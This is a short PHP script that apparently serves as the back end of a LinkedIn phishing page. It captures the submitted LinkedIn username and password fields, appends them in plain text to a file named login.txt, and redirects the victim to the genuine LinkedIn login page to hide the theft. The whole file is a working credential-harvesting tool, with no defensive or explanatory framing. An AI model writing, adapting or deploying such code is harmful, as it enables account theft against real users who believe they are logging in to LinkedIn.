<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['session_key'] ?? '';
    $password = $_POST['session_password'] ?? '';

    $log = "Linkedin Username: $username | Pass: $password\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://www.linkedin.com/login');
    exit();
}
?>
